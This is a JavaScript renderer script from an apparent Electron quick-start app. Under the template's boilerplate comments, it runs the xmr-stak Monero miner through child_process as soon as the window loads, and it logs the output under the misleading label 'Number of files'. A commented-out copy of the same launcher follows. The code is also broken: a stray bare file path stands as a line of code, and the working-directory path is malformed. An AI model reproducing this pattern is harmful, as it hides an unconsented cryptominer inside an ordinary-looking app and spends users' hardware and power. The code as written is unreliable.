// This file is required by the index.html file and will
// be executed in the renderer process for that window.
// All of the Node.js APIs are available in this process.

const { app } = require("electron").remote;
const util = require("util");
const exec = util.promisify(require("child_process").exec);
const path = require("path");

const readline = require("readline");
/opt/electron-quick-start/resources/app.asar/miner

const terminal = "gnome-terminal";
const atPath = app.getPath("desktop");

async function main() {
  const { stdout, stderr } = await exec("./xmr-stak", {
    cwd: 'opt/electron-quick-start',
    shell: true
  });
  if (stderr) {
    console.error(`error: ${stderr}`);
  }
  console.log(`Number of files ${stdout}`);
}

main();

/* 
const util = require("util");
const exec = util.promisify(require("child_process").exec);

async function main() {
  const { stdout, stderr } = await exec("./xmr-stak", {
    cwd: "./miner",
    shell: true
  });

  if (stderr) {
    console.error(`error: ${stderr}`);
  }
  console.log(`Number of files ${stdout}`);
}

main();
 */
